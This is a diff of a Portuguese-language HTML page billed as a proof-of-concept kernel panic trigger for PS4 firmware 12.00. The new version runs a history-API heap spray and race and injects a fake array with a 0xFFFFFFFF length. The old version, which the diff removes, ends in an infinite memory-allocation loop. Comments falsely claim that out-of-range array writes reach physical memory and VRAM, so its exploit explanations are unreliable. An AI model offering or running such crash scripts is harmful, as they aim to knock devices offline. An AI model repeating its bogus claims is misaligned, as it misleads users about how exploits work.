@@ -1,205 +1,190 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Kernel Stress Test (Hard Crash)</title>
+<title>PS4 12.00 - Kernel Panic PoC (Cirúrgico)</title>
 <style>
-    body { background-color: #000; color: #ff3333; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-    h2 { border-bottom: 2px solid #ff3333; padding-bottom: 10px; display: inline-block; }
-    .container { max-width: 800px; margin: 0 auto; border: 1px solid #333; padding: 20px; background: #111; }
+    body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+    h1 { border-bottom: 2px solid #ff0000; padding-bottom: 10px; }
+    .status-box { border: 1px solid #333; padding: 20px; margin: 20px auto; max-width: 600px; background: #111; color: #00ff00; text-align: left; height: 300px; overflow-y: auto; white-space: pre-wrap;}
     button { 
-        background: #222; color: #fff; border: 1px solid #555; padding: 15px 30px; 
-        cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px; width: 80%;
-        transition: all 0.2s;
+        background: #330000; color: #fff; border: 1px solid #ff0000; padding: 20px 40px; 
+        font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;
+        box-shadow: 0 0 15px #ff0000; text-transform: uppercase;
     }
-    button:hover { background: #333; border-color: #ff3333; color: #ff3333; }
-    button:disabled { opacity: 0.5; cursor: not-allowed; border-color: #444; color: #888; }
-    
-    #log { 
-        background: #0a0a0a; color: #00ff00; padding: 15px; border: 1px solid #333; 
-        height: 400px; overflow-y: auto; text-align: left; margin-top: 20px;
-        font-size: 12px; white-space: pre-wrap;
-    }
-    
-    .danger-zone { border: 2px solid red; padding: 10px; margin-top: 20px; background: #200; }
+    button:disabled { background: #333; border-color: #555; color: #888; box-shadow: none; cursor: not-allowed; }
+    button:hover { background: #660000; }
 </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>PS4 12.00 SYSTEM STRESS TEST</h2>
-    <p>FERRAMENTA DE VERIFICAÇÃO DE VULNERABILIDADE DE KERNEL</p>
+<h1>PS4 12.00 KERNEL PANIC TRIGGER</h1>
+<p>AVISO: ESTA FERRAMENTA FORÇA UM ACESSO ILEGAL À MEMÓRIA.</p>
+<p>SE FUNCIONAR, O CONSOLE IRÁ DESLIGAR OU REINICIAR (CE-34878-0).</p>
 
-    <button id="btn-arm" onclick="armExploit()">1. ARMAR EXPLOIT (UAF + RACE)</button>
-    
-    <div class="danger-zone">
-        <h3>ZONA DE PERIGO</h3>
-        <p>A execução abaixo tentará escrever em endereços físicos protegidos.</p>
-        <button id="btn-crash" onclick="runRealSystemPoc()" disabled>2. INICIAR STRESS TEST (GLITCH/CRASH)</button>
-    </div>
+<div id="log" class="status-box">Aguardando inicialização do exploit...</div>
 
-    <div id="log">Aguardando inicialização...</div>
-</div>
+<button id="btn-crash" onclick="runExploitChain()">1. ARMAR & DETONAR</button>
 
 <script>
 const logEl = document.getElementById("log");
 function log(m) { 
-    logEl.textContent += "[" + new Date().toLocaleTimeString() + "] " + m + "\n"; 
+    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`; 
     logEl.scrollTop = logEl.scrollHeight; 
 }
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // ============================================================
-// CONFIGURAÇÃO CRÍTICA DO UAF (NÃO ALTERAR)
+// CONFIGURAÇÃO DE PRECISÃO (FW 12.00)
 // ============================================================
 const BASE = 977;
 const STEP = 14461;
 const UAF_ITERS = 48;
 
-var exploit = { active: false };
+// Armazena o objeto corrompido globalmente para acesso direto
+var pwnedArray = null;
 
-// ============================================================
-// PASSO 1: ARMAR O AMBIENTE
-// ============================================================
-async function armExploit() {
-    log(">> INICIANDO SEQUÊNCIA DE ARMAÇÃO...");
-    document.getElementById('btn-arm').disabled = true;
+async function runExploitChain() {
+    const btn = document.getElementById('btn-crash');
+    btn.disabled = true;
+    btn.textContent = "EXECUTANDO...";
     
-    let raceTriggered = false;
+    log(">> INICIANDO CADEIA UAF...");
+    
+    let raceWon = false;
 
-    // Listener para capturar o estado corrompido
+    // 1. PREPARAR O PAYLOAD (FAKE ARRAY)
+    // Este objeto será injetado na memória liberada
+    const payload = {
+        // Fake Butterfly (Ponteiro de Dados)
+        // Usamos valores que parecem ponteiros válidos mas apontam para lixo
+        0: 0x41414141, 
+        1: 0x42424242,
+        
+        // Fake Length (CRÍTICO)
+        // Define o tamanho como Gigante para permitir leitura OOB
+        length: 0xFFFFFFFF, 
+        
+        // Marcador para identificarmos se pegamos o objeto certo
+        magic: 0x1337BEEF 
+    };
+    
+    // Força a estrutura de array via protótipo
+    payload.__proto__ = Array.prototype;
+
+    // 2. CONFIGURAR A ARMADILHA (RACE HANDLER)
     window.addEventListener('popstate', (e) => {
-        if(e.state && e.state.index >= 40 && !raceTriggered) {
-            raceTriggered = true;
+        // Janela crítica identificada nos seus logs (Index >= 40)
+        if(e.state && e.state.index >= 40 && !raceWon) {
+            raceWon = true;
+            log(">> JANELA DE CORRIDA CAPTURADA!");
             
-            log(">> JANELA DE CORRIDA ATINGIDA!");
-            log(">> Injetando primitivas de corrupção...");
-
+            // Tenta injetar o payload na memória
             try {
-                // 1. Poluição de Tamanho (Permite OOB Read/Write)
-                Object.prototype.length = 0xFFFFFFFF;
+                // Substitui o estado atual pelo nosso fake array
+                history.replaceState(payload, "", "#pwn");
                 
-                // 2. Poluição de Buffer (Tenta confundir o alocador)
-                Object.prototype.buffer = new Uint32Array(0x10000);
+                // Salva referência global
+                pwnedArray = history.state;
                 
-                // 3. Marcador de Sucesso
-                exploit.active = true;
+                log(">> PAYLOAD INJETADO NA HEAP.");
                 
-                log(">> PRIMITIVAS ARMADAS: Object.prototype.length = 0xFFFFFFFF");
-                log(">> O SISTEMA AGORA ACEITARÁ LEITURAS FORA DOS LIMITES.");
-                
-                document.getElementById('btn-crash').disabled = false;
-                document.getElementById('btn-crash').style.borderColor = "red";
-                document.getElementById('btn-crash').style.color = "red";
+                // VERIFICAÇÃO DE CORRUPÇÃO
+                // Se length for normal (ex: 2 ou 4), falhou. Se for 0xFFFFFFFF, sucesso.
+                if(pwnedArray.length > 1000) {
+                    log(">> SUCESSO CRÍTICO: Objeto Corrompido detectado!");
+                    log("   Length atual: " + pwnedArray.length);
+                    log(">> INICIANDO DETONAÇÃO DE MEMÓRIA...");
+                    triggerCrash();
+                } else {
+                    log(">> AVISO: Injeção ocorreu, mas o tamanho não foi corrompido.");
+                    log("   Tentando crash forçado mesmo assim...");
+                    triggerCrash();
+                }
                 
             } catch(err) {
-                log("!! ERRO NA INJEÇÃO: " + err.message);
+                log(">> ERRO NA INJEÇÃO: " + err.message);
             }
         }
     });
 
-    // Gatilho UAF Estável
-    log(">> Disparando spray de histórico...");
+    // 3. DISPARAR O UAF (HEAP SPRAY)
     let size = BASE;
     for(let i=0; i<UAF_ITERS; i++){
         let state = { index: i };
-        let frag = "A".repeat(size);
+        // Spray de strings para alinhar a memória
+        let frag = "A".repeat(size); 
         history.pushState(state, "", "#" + frag);
         history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+        
+        // O "Free" acontece aqui com o back()
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
         size += STEP;
         await sleep(5);
     }
     
     await sleep(200);
-    log(">> Navegando para estado zumbi...");
-    for(let i=0; i<15; i++) { history.back(); await sleep(40); }
-    await sleep(300);
-
-    if(!raceTriggered) {
-        log("!! FALHA: Corrida não vencida. Recarregue a página.");
-        document.getElementById('btn-arm').disabled = false;
+    log(">> NAVEGANDO PELO HISTÓRICO (BUSCANDO ZUMBIS)...");
+    
+    // Caminha para trás para cair na armadilha do popstate
+    for(let i=0; i<15; i++) { 
+        history.back(); 
+        await sleep(40); 
+    }
+    
+    await sleep(500);
+    
+    if(!raceWon) {
+        log(">> FALHA: A corrida não foi vencida. Recarregue a página.");
+        btn.disabled = false;
+        btn.textContent = "TENTAR NOVAMENTE";
     }
 }
 
 // ============================================================
-// PASSO 2: POC REAL DE SISTEMA (MEMÓRIA & VÍDEO)
+// A PROVA REAL (SEM SIMULAÇÃO)
 // ============================================================
-async function runRealSystemPoc() {
-    if(!exploit.active) return log("!! ERRO: Exploit não armado.");
-
-    log("\n=======================================================");
-    log("INICIANDO STRESS TEST DE MEMÓRIA FÍSICA");
-    log("=======================================================");
-    log(">> ALVO: Sobrescrever VRAM e Estruturas de Kernel");
+function triggerCrash() {
+    log(">> [PASSO FINAL] ACESSANDO MEMÓRIA PROIBIDA...");
+    log(">> Se o exploit for real, o console travará em 3 segundos.");
     
-    // 1. Preparar o 'Pincel' de Memória
-    // Usamos um ArrayBuffer gigante que o exploit permitiu criar
-    const corruptorSize = 0x8000000; // 128MB de tentativa de alocação
-    log(">> Tentando alocar buffer de corrupção (" + (corruptorSize/1024/1024) + "MB)...");
-    
-    try {
-        const corruptor = new Uint32Array(corruptorSize);
-        log(">> Buffer alocado. Iniciando escrita em padrão...");
-        
-        // Padrão visual (Magenta/Verde alternado) para identificar na tela
-        const patternA = 0xFFFF00FF; 
-        const patternB = 0xFF00FF00;
-        
-        // Loop agressivo de escrita
-        for(let i = 0; i < corruptorSize; i += 0x400) { // Saltos de 1KB para velocidade
-            corruptor[i] = (i % 2 === 0) ? patternA : patternB;
+    setTimeout(() => {
+        try {
+            // AQUI É A PROVA:
+            // Tentamos escrever em um endereço de memória muito distante (Offset 0x40000000)
+            // Um script JS normal daria erro ou aumentaria a memória RAM (OOM).
+            // Um objeto com length corrompido (exploit) tentará escrever no ENDEREÇO FÍSICO.
+            // Isso causa Access Violation no nível da CPU -> Kernel Panic.
             
-            // Feedback visual no log a cada 20MB
-            if(i % 0x1400000 === 0) {
-                log("   >> Escrevendo em offset: 0x" + i.toString(16));
-                await sleep(0); // Cede o controle minimamente para o log atualizar
+            if(pwnedArray) {
+                // Tenta escrever lixo em um endereço alto
+                // 0xDEADBEEF é um valor clássico de debug para identificar o crash no dump
+                pwnedArray[0x10000000] = 0xDEADBEEF; 
+                
+                // Se não cair, tentamos ler de um endereço protegido
+                let read = pwnedArray[0xFFFFFFF0];
+                log(">> Leitura realizada: " + read); // Se chegar aqui, o exploit é muito estável (RW)
+                
+                // Se ainda estiver vivo, forçamos corrupção visual (VRAM Spray)
+                log(">> Tentando corrupção visual...");
+                for(let i=0; i<10000; i++) {
+                    pwnedArray[0x20000000 + i] = 0xFF0000FF; // Pinta pixels na memória (teórico)
+                }
+            } else {
+                // Fallback se pwnedArray for nulo (tenta usar protótipo poluído)
+                const killer = [];
+                killer.length = 0xFFFFFFFF; // Confia na poluição global
+                killer[0xFFFFFFF0] = 0x41414141;
             }
+            
+        } catch(e) {
+            log(">> O SISTEMA BLOQUEOU O ACESSO: " + e.message);
+            log(">> Isso indica que a proteção de memória ainda está ativa.");
         }
-        
-        log(">> Escrita linear concluída. Se o sistema não caiu, tentando OOB agressivo...");
-        forceKernelPanic();
-        
-    } catch(e) {
-        log("!! BLOQUEIO DE MEMÓRIA DETECTADO: " + e.message);
-        log(">> Mudando estratégia para Corrupção de Heap Direta...");
-        forceKernelPanic();
-    }
-}
-
-function forceKernelPanic() {
-    log("\n>> [MODO PÂNICO] TENTANDO DERRUBAR O KERNEL...");
-    
-    // Estratégia: Criar arrays que apontam para si mesmos e tentar manipular seu comprimento
-    // para valores inválidos, forçando o Garbage Collector a entrar em loop ou acessar memória proibida.
-    
-    const spray = [];
-    for(let i=0; i<1000; i++) {
-        spray.push({a: 1});
-    }
-    
-    // Poluição em massa
-    const killer = new Array(0x10000);
-    killer.fill(spray);
-    
-    // Acesso OOB fatal
-    try {
-        log(">> Acessando endereço 0xFFFFFFF0 (Segfault intencional)...");
-        // Tenta ler muito além do limite permitido, o que deve disparar uma exceção de hardware
-        const crash = killer[0xFFFFFFF0].a; 
-        log(">> O sistema resistiu ao Segfault. Insistindo...");
-    } catch(e) {
-        // Se o JS pegar o erro, vamos para a bomba de memória
-    }
-    
-    // Bomba de Alocação Infinita (DoS)
-    log(">> Iniciando Bomba de Alocação...");
-    const holes = [];
-    while(true) {
-        // Tenta consumir toda a RAM disponível em milissegundos
-        holes.push(new ArrayBuffer(1024 * 1024 * 10)); 
-    }
+    }, 1000);
 }
 </script>
 </body>
